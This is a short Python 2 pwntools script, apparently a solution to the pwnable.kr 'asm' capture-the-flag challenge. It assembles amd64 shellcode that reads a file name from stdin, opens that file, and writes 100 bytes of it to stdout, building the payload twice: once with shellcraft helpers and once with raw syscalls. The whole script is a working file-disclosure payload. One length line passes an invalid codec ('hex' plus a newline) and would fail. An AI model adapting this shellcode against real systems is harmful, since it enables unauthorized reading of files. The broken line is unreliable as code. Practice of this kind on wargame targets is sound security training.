from pwn import *

filename = "./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\x00"

filename_add = 0x41414500
flag_add = 0x41414700

context(arch='amd64', os='linux')

stdin = 0
stdout = 1

payload = ""
payload += asm(shellcraft.read(stdin, filename_add, len(filename)))
payload += asm(shellcraft.open(filename_add, 0, 0400))
payload += asm(shellcraft.read('rax', flag_add, 100))
payload += asm(shellcraft.write(stdout, flag_add, 100))

payload2 = ""
payload2 += asm(shellcraft.amd64.linux.syscall('SYS_read', stdin, filename_add, len(filename)))
payload2 += asm(shellcraft.amd64.linux.syscall('SYS_open', filename_add, 0, 0400))
payload2 += asm(shellcraft.amd64.linux.syscall('SYS_read', 'rax', flag_add, 100))
payload2 += asm(shellcraft.amd64.linux.syscall('SYS_write', stdout, flag_add, 100))

print payload.encode('hex')
print len(payload.encode('hex'+'\n'))

sleep(2)
print payload2.encode('hex')
print len(payload2.encode('hex'))
